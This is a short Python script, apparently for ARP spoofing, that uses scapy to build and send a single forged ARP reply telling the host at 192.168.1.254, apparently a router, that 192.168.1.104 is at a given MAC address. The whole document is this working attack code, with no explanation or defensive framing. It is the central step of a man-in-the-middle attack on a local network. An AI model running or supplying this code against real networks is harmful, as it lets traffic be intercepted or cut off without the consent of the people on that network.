import scapy.all as scapy
packet= scapy.ARP(op=2,pdst="192.168.1.254",hwdst="a4:34:d9:af:35:20",psrc="192.168.1.104")
scapy.send(packet)